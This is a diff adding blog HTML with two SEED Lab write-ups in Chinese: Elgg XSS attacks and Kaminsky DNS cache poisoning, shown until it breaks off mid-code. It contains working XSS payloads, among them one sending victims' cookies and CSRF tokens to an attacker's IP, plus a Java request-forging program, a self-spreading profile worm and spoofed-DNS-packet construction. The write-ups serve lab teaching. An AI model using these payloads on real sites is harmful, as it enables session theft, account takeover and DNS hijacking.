@@ -292,6 +292,804 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2017/05/16/xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="binpang">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="PCB博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/05/16/xss/" itemprop="url">SeedLab:Web XSS</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-16T18:18:48+08:00">
+                2017-05-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络/" itemprop="url" rel="index">
+                    <span itemprop="name">网络</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="环境配置："><a href="#环境配置：" class="headerlink" title="环境配置："></a>环境配置：</h2><ul>
+<li>启动apache2服务：sudo service apache2 start</li>
+<li>配置Apache服务，在/etc/apache2/sites-available/default中，配置如下：<br><img src="http://i.imgur.com/5pqUZOD.png" alt=""></li>
+</ul>
+<h2 id="实验内容："><a href="#实验内容：" class="headerlink" title="实验内容："></a>实验内容：</h2><h3 id="Task-1-显示Alert窗口"><a href="#Task-1-显示Alert窗口" class="headerlink" title="Task 1:显示Alert窗口"></a>Task 1:显示Alert窗口</h3><p>在用户名boby下的修改信息这一网页中，在个人说明中插入alert信息：</p>
+<pre><code>&lt;script&gt;alert(‘XSS’);&lt;/script&gt;
+</code></pre><p>如下图所示:</p>
+<p><img src="http://i.imgur.com/N9cIcKG.png" alt=""></p>
+<p>登陆用户名bin，然后查看boby的信息，结果如下，会弹出一个窗口，结果如下：</p>
+<p><img src="http://i.imgur.com/y1OoHxo.png" alt=""></p>
+<p>将恶意内容放入js文件中，然后把链接指向js文件，具体指令如下：</p>
+<p><img src="http://i.imgur.com/k7CaLZX.png" alt=""></p>
+<p>attack.js文件的内容如下,将该文件放入xss.lagelgg.com的根目录下(/var/www/XSS/elgg/)</p>
+<p><img src="http://i.imgur.com/kqdzKtD.png" alt=""></p>
+<p>bin用户访问boby用户的信息时，攻击成功：</p>
+<p><img src="http://i.imgur.com/IMb4qmJ.png" alt=""></p>
+<h3 id="Task2-展示用户的cookie信息"><a href="#Task2-展示用户的cookie信息" class="headerlink" title="Task2:展示用户的cookie信息"></a>Task2:展示用户的cookie信息</h3><p>在boby用户信息的编写框中输入如下攻击信息:</p>
+<pre><code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+</code></pre><p><img src="http://i.imgur.com/ga3JzGq.png" alt=""></p>
+<p>然后bin用户查看boby用户的信息时，出现如下弹框:</p>
+<p><img src="http://i.imgur.com/QyziMTx.png" alt=""></p>
+<h3 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3:"></a>Task 3:</h3><p>在boby用户信息的编写框中输入如下攻击信息(其中192.168.47.181为攻击中机器的ip地址):</p>
+<pre><code>&lt;script&gt;document.write(&apos;&lt;img src =http://192.168.47.181:5555?c=&apos;+escape(document.cookie) + &apos; &gt;&apos;);&lt;/script&gt;
+</code></pre><p><img src="http://i.imgur.com/xcXiUaH.png" alt=""></p>
+<p>然后在攻击者机器中运行echoserv文件，让它监听5555端口，当bin用户查看boby的用户信息的时候，bin用户的cookie信息被发送到攻击者的机器上：</p>
+<p><img src="http://i.imgur.com/pdgq8iN.png" alt=""></p>
+<h3 id="Task4-用偷来的Cookie来进行会话攻击"><a href="#Task4-用偷来的Cookie来进行会话攻击" class="headerlink" title="Task4:用偷来的Cookie来进行会话攻击"></a>Task4:用偷来的Cookie来进行会话攻击</h3><p>首先在boby的用户信息编写框中输入如下信息:</p>
+<pre><code>&lt;script&gt;document.write(&apos;&lt;img src=http://127.0.0.1:5555?c=&apos;+escape(document.cookie)+&apos;&amp;&apos;+elgg.security.token.__elgg_ts+&apos;&amp;&apos;+elgg.security.token.__elgg_token+&apos;  &gt;&apos;);&lt;/script&gt;
+</code></pre><p>该js脚本的作用就是将访问boby用户信息的用户的cookie和<strong>elgg_ts,</strong>elgg_token信息发送到攻击者机器。</p>
+<p><img src="http://i.imgur.com/M9o46Az.png" alt=""></p>
+<p>用LiveHttpHeaders工具来查看加好友的包的情况：</p>
+<p><img src="http://i.imgur.com/1YGba3O.png" alt=""></p>
+<p>根据抓的包的信息来完成程序的构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">import java.net.*;</div><div class="line">import java.io.*;</div><div class="line">public class HTTPSimpleForge &#123;</div><div class="line">       public static void main(String[] args) throws IOException &#123;</div><div class="line">       try &#123;</div><div class="line">             int responseCode;</div><div class="line">             InputStream responseIn=null;</div><div class="line">             // URL to be forged.</div><div class="line">             URL url = new URL (&quot;http://www.xsslabelgg.com/action/friends/add?friend=41&amp;__elgg_ts=1464013312&amp;__elgg_token=c2aa7157f41d7d265d4f082aa0b03b4f&quot;);</div><div class="line">             URLConnection urlConn = url.openConnection();</div><div class="line">             if (urlConn instanceof HttpURLConnection) &#123;</div><div class="line">                    urlConn.setConnectTimeout(60000);</div><div class="line">                    urlConn.setReadTimeout(90000);</div><div class="line">             &#125;</div><div class="line">     urlConn.addRequestProperty(&quot;Host&quot;,&quot;www.xsslabelgg.com&quot;);</div><div class="line">     urlConn.addRequestProperty(&quot;User-Agent&quot;,&quot;Sun JDK 1.6&quot;);</div><div class="line">     urlConn.setRequestProperty(&quot;Accept&quot;,&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;);</div><div class="line">     urlConn.setRequestProperty(&quot;Accept-Language&quot;,&quot;en-us,en;q=0.5&quot;);</div><div class="line">     urlConn.setRequestProperty(&quot;Accept-Encoding&quot;,&quot;gzip,deflate&quot;);</div><div class="line">     urlConn.setRequestProperty(&quot;Referer&quot;,&quot;http://www.xsslabelgg.com/profile/charlie&quot;);</div><div class="line">     urlConn.setRequestProperty(&quot;Cookie&quot;,&quot;Elgg=rpmo7shdmq6b6kdg38o76oo3j5&quot;);</div><div class="line">     urlConn.setRequestProperty(&quot;Connection&quot;,&quot;keep-alive&quot;);</div><div class="line">             urlConn.setDoOutput(true);</div><div class="line">             String data=&quot;username=charlie&amp;seed=charlie@seed.com&quot;;</div><div class="line">             OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());</div><div class="line">             wr.write(data);</div><div class="line">             wr.flush();</div><div class="line">              // HttpURLConnection a subclass of URLConnection is returned by</div><div class="line">              // url.openConnection() since the url is an http request.</div><div class="line">              if (urlConn instanceof HttpURLConnection) &#123;</div><div class="line">                     HttpURLConnection httpConn = (HttpURLConnection) urlConn;</div><div class="line">                     // Contacts the web server and gets the status code from</div><div class="line">                     // HTTP Response message.</div><div class="line">                     responseCode = httpConn.getResponseCode();</div><div class="line">                     System.out.println(&quot;Response Code = &quot; + responseCode);</div><div class="line">                     // HTTP status code HTTP_OK means the response was</div><div class="line">                     // received sucessfully.</div><div class="line">                     if (responseCode == HttpURLConnection.HTTP_OK) &#123;</div><div class="line">                            // Get the input stream from url connection object.</div><div class="line">                            responseIn = urlConn.getInputStream();</div><div class="line">                            // Create an instance for BufferedReader</div><div class="line">                            // to read the response line by line.</div><div class="line">                            BufferedReader buf_inp = new BufferedReader(</div><div class="line">                            new InputStreamReader(responseIn));</div><div class="line">                            String inputLine;</div><div class="line">                            while((inputLine = buf_inp.readLine())!=null) &#123;</div><div class="line">                                   System.out.println(inputLine);</div><div class="line">                            &#125;</div><div class="line">                     &#125;</div><div class="line">              &#125;</div><div class="line">       &#125; catch (MalformedURLException e) &#123;</div><div class="line">              e.printStackTrace();</div><div class="line">       &#125;</div><div class="line">       &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>更改攻击者机器的/etc/hosts文件,使其修改/etc/hosts文件：<br>将www.xsslabelgg.com的ip地址改为192.168.47.185（受害者机器的ip）<br><img src="http://i.imgur.com/8WasNN3.png" alt=""></p>
+<p>在受害者机器上登入samy用户,首先查看samy的好友情况，可知现在samy没有好友:</p>
+<p><img src="http://i.imgur.com/5dT7ZdX.png" alt=""></p>
+<p>Samy查看boby的信息，其cookie信息，cookie和<strong>elgg_ts,</strong>elgg_token信息都发回了攻击者机器：</p>
+<p><img src="http://i.imgur.com/kbNBloR.png" alt=""></p>
+<p>将编写的攻击程序的cookie，<strong>elgg_ts,</strong>elgg_token等信息填充好，编译程序Javac HTTPSimpleForge.java，然后运行java HTTPSimpleForge,收到html的返回信息：</p>
+<p><img src="http://i.imgur.com/Kdcs3Mt.png" alt=""></p>
+<p>可知结果为200，查看samy的好友信息如下：</p>
+<p><img src="http://i.imgur.com/XO3lsaV.png" alt=""></p>
+<p>可知攻击成功。</p>
+<h3 id="Task-5：写一个XSS蠕虫"><a href="#Task-5：写一个XSS蠕虫" class="headerlink" title="Task 5：写一个XSS蠕虫"></a>Task 5：写一个XSS蠕虫</h3><p>首先登陆boby用户，修改用户信息，查看包的情况如下：</p>
+<p><img src="http://i.imgur.com/UXlx68J.png" alt=""></p>
+<p>根据包的情况编写worm.js程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">var nod = document.getElementsByClassName(&quot;elgg-border-plain elgg-transition&quot;);</div><div class="line">var user = nod[0].attributes.getNamedItem(&quot;alt&quot;).nodeValue;</div><div class="line">if(user != &apos;Boby&apos;)</div><div class="line">&#123;</div><div class="line">var Ajax=null;</div><div class="line">// Construct the header information for the HTTP request</div><div class="line">Ajax=new XMLHttpRequest();</div><div class="line">if(Ajax == null)</div><div class="line">	alert(&quot;Ajax is null&quot;);</div><div class="line">Ajax.open(&quot;POST&quot;,&quot;http://www.xsslabelgg.com/action/profile/edit&quot;,true);</div><div class="line">Ajax.setRequestHeader(&quot;Host&quot;,&quot;www.xsslabelgg.com&quot;);</div><div class="line">Ajax.setRequestHeader(&quot;User-Agent&quot;,&quot;AJAX 1.2&quot;);</div><div class="line">Ajax.setRequestHeader(&quot;Accept&quot;,&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;);</div><div class="line">Ajax.setRequestHeader(&quot;Accept-Language&quot;,&quot;en-US,en;q=0.5&quot;);</div><div class="line">Ajax.setRequestHeader(&quot;Accept-Encoding&quot;,&quot;gzip,deflate&quot;);</div><div class="line">var node = document.getElementsByClassName(&quot;elgg-border-plain elgg-transition&quot;);</div><div class="line">var username = node[0].attributes.getNamedItem(&quot;alt&quot;).nodeValue;</div><div class="line">Ajax.setRequestHeader(&quot;Refer&quot;,&quot;http://www.xsslabelgg.com/profile/&quot;+username+&quot;/edit&quot;);</div><div class="line">Ajax.setRequestHeader(&quot;Keep-Alive&quot;,&quot;300&quot;);</div><div class="line">Ajax.setRequestHeader(&quot;Connection&quot;,&quot;keep-alive&quot;);</div><div class="line">Ajax.setRequestHeader(&quot;Cookie&quot;,document.cookie);</div><div class="line">Ajax.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);</div><div class="line">// Construct the content. The format of the content can be learned</div><div class="line">// from LiveHTTPHeaders.</div><div class="line">var content = &quot;__elgg_token=&quot;+elgg.security.token.__elgg_token+&quot;&amp;__elgg_ts=&quot;+elgg.security.token.__elgg_ts+&quot;&amp;name=&quot;+username+&quot;&amp;description=I&apos;m stupid&amp;guid=&quot;+elgg.session.user.guid;</div><div class="line">Ajax.setRequestHeader(&quot;Content-Length&quot;,content.length);</div><div class="line">// Send the HTTP POST request.</div><div class="line">Ajax.send(content);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>现在在boby的profile中添加worm:</p>
+<p><img src="http://i.imgur.com/PqDend5.png" alt=""></p>
+<p>更改完毕：</p>
+<p><img src="http://i.imgur.com/c9FX8Pl.png" alt=""></p>
+<p>现在以samy的身份登入，首先查看一下samy的信息，发现什么都没有描述：</p>
+<p><img src="http://i.imgur.com/DSi5QVq.png" alt=""></p>
+<p>然后其访问boby的个人信息：</p>
+<p><img src="http://i.imgur.com/WEYBOkh.png" alt=""></p>
+<p>再次查看自己的信息：</p>
+<p><img src="http://i.imgur.com/1OUoH74.png" alt=""></p>
+<p>攻击成功。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2017/05/16/remote-dns-attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="binpang">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="PCB博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/05/16/remote-dns-attack/" itemprop="url">SeedLab:Remote DNS Attack</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-16T18:15:25+08:00">
+                2017-05-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络/" itemprop="url" rel="index">
+                    <span itemprop="name">网络</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h2><p>服务器ip：192.168.86.139</p>
+<p>Victim ip: 192.168.86.137</p>
+<p>Attacker ip:192.168.86.138</p>
+<h3 id="准备工作："><a href="#准备工作：" class="headerlink" title="准备工作："></a>准备工作：</h3><ol>
+<li><p>安装bind9服务器：</p>
+<ul>
+<li><p>在<a href="http://www.isc.org/downloads/" target="_blank" rel="external">bind9官网</a> 下载bind9,在此下载的是bind9.10.4</p>
+</li>
+<li><p>解压文件tar -xzvf bin9.10.4.tar.gz</p>
+</li>
+<li><p>cd bin9.10.4,并./configure –prefix=/usr/local/bind-9.9.0 –enable-threads –disable-openssl-version-check –sysconfdir=/etc –with-libtool –without-openssl</p>
+</li>
+<li><p>由于没有安装openssl，所以在最后的选项中加入–without-openssl</p>
+</li>
+<li><p>make &amp; make install</p>
+</li>
+<li><p>ln –sv /usr/local/bind-9.9.0 /usr/local/bind 软连接</p>
+</li>
+<li><p>在服务器中开启 sudo rndc flush // 刷新cache</p>
+</li>
+<li><p>sudo rndc dumpdb -cache // 将cache dump到dump.db</p>
+</li>
+</ul>
+</li>
+<li><p>开启bind9服务：sudo service bind9 start</p>
+</li>
+<li><p>用户机器配置：</p>
+</li>
+</ol>
+<ul>
+<li><p>vi /etc/resolv.conf，修改nameserve 192.168.86.138（DNS服务器地址）</p>
+</li>
+<li><p>在ubuntu中，/etc/resolv.conf可能被DHCP客户端更改，所以需要将DHCP关闭，具体做法如下：settings-&gt;network-&gt;options-&gt;IPV4 Settings，设置method为Automatically DHCP addresses only, 并在DNS servers处填写为DNS服务器地址<br><img src="http://i.imgur.com/ja47YZq.png" alt=""></p>
+</li>
+</ul>
+<ol>
+<li>查看用户机是否将dns服务器配置成功：打开wireshark，并在该机器中ping www.google.com,在wireshark的筛选规则中填写dns，查看抓包情况：<br><img src="http://i.imgur.com/qXCXOkn.png" alt=""></li>
+</ol>
+<h2 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h2><h3 id="实验一：Kaminsky攻击"><a href="#实验一：Kaminsky攻击" class="headerlink" title="实验一：Kaminsky攻击"></a>实验一：Kaminsky攻击</h3><p>攻击准备：</p>
+<ul>
+<li><p>确认攻击机器的连接方式是NAT</p>
+</li>
+<li><p>由于DNS的服务器端口可能不确定，在此将服DNS服务器的端口设置为33333，具体设置如下：vi /etc/bind/named.conf.options,添加query-source port 33333;</p>
+</li>
+<li><p>将DNS服务器的DNSSEC策略关闭，具体设置如下：vi /etc/bind/named.conf.options，找到dnssec-validation auto;，将其注释掉，并添加dnssec-enable no;</p>
+</li>
+<li><p>刷新dns cache，并从其dns服务：</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo rndc flush</div><div class="line">sudo service bind9 restart</div></pre></td></tr></table></figure>
+<h4 id="实验原理："><a href="#实验原理：" class="headerlink" title="实验原理："></a>实验原理：</h4><p>（1）攻击者向被攻击的本地缓存DNS发送一个域名的DNS 查询请求，该查询请求中的域名主机使用随机序列和目标域名的组合。<br>例如www123456.test.com，其中ns2.test.com为目标域名，www123456是随机生成的。很显然，这个查询的域名主机记录在test.com的权威DNS中是不存在的。正常test.com的权威DNS要返回NXDOMIAN（代表域名不存在）。换句话说就是本地缓存DNS中肯定没有www123456.test.com的缓存记录，本地缓存DNS接收到这个域名查询请求后肯定是要出去迭代请求的。</p>
+<p>（2）攻击者伪造test.com的权威DNS应答数据包中，应答资源记录部分与正确应答包中部分是与正常结果一样的，比如test.com的DNS的IP地址、UDP端口号、应答结果是NXDOMAIN。<br>但是，在应答报文中的授权资源记录部分，攻击者伪造一个test.com的NS记录为ns2.test.com，且该记录对应的A记录IP是2.2.2.2（可能是一个钓鱼网站的IP）。那么该资源记录信息将也被写入本地缓存DNS的Cache 中，在Cache 保持时间内，对test.com名字服务器所管辖的所有域名的查询都将被发送到攻击者自己控制的IP（2.2.2.2）中。</p>
+<p>具体攻击过程：</p>
+<h4 id="找到example-com域名服务器的ip地址"><a href="#找到example-com域名服务器的ip地址" class="headerlink" title="找到example.com域名服务器的ip地址"></a>找到example.com域名服务器的ip地址</h4><p>在攻击者机器上ping www.example.com，用wireshark抓包有如下这个数据包，该数据包是从199.43.133.53的ip地址回复的example.com包的查询。所以需要伪造的ip地址为199.43.133.53。<br><img src="http://i.imgur.com/jhYDLw2.png" alt=""></p>
+<h4 id="构造回复包"><a href="#构造回复包" class="headerlink" title="构造回复包"></a>构造回复包</h4><p>在此主要介绍构造DNS域的包的过程。<br><img src="http://i.imgur.com/eQH1qFd.png" alt=""></p>
+<p>DNS包的结果如上图所示：在此介绍构造每一个域的过程。</p>
+<p>DNS头有16个字节，分别是标识ID，标志，问题数，资源数，授权资源记录数，额外资源记录数，结果如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">   struct dnsheader &#123;</div><div class="line">	unsigned short int query_id;</div><div class="line">	unsigned short int flags;</div><div class="line">	unsigned short int QDCOUNT;</div><div class="line">	unsigned short int ANCOUNT;</div><div class="line">	unsigned short int NSCOUNT;</div><div class="line">	unsigned short int ARCOUNT;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+<ul>
+<li><p>其中标志ID为DNS报文的ID，对于相关联的请求报文和应答报文，这个字段是相同的，由此可以区分DNS应答报文是哪个请求报文的响应。由于不知道dns请求199.43.133.53时的ID号，所以在此将id号从3000到3100，每个id号都构造一个包。’</p>
+</li>
+<li><p>对于flags来说，根据wireshark抓包可知，大小为0x8400</p>
+</li>
+<li><p>随后的8个字节，由wireshark抓包可得，这四个域都为1。</p>
+</li>
+<li><p>随后就是将查询问题的内容给加进去，由于源程序给了构造查询问题的步骤，所以，现在直接将其构造的内容加进去即可。</p>
+</li>
+<li><p>Dns查询域名的结果的构造，如下图所示，该域主要是回答了www.example.com的ip地址和以及类型和类，该出类型为A,表示是由域名获得该域名的IP地址，类为IN，表示表示为Internet名字空间。所以在构造该域的时候可以将ip地址改了，我在该实验中将ip地址改为了1.2.3.4</p>
+</li>
+</ul>
+<p><img src="http://i.imgur.com/Vp00m1S.png" alt=""></p>
+<ul>
+<li>接下来是要构造域名服务器，也是要构造的重点，由wireshark抓包得：<br><img src="http://i.imgur.com/O7mAu0y.png" alt=""></li>
+</ul>
+<p>该域主要有Name，Type，Class，TTL，Data length和NS构成，其中Type为NS表示为Name Server，即域名服务器，TTL为该记录的有效时间, Name表示主域名。所以我在此构造将Name Server改为了ns.dnslabattacker.net。</p>
+<ul>
+<li>接下来就是一些额外的信息，由wireshark抓包如下图所示：<br><img src="http://i.imgur.com/9f82Vrl.png" alt=""></li>
+</ul>
+<h4 id="写具体的程序进行攻击"><a href="#写具体的程序进行攻击" class="headerlink" title="写具体的程序进行攻击"></a>写具体的程序进行攻击</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div 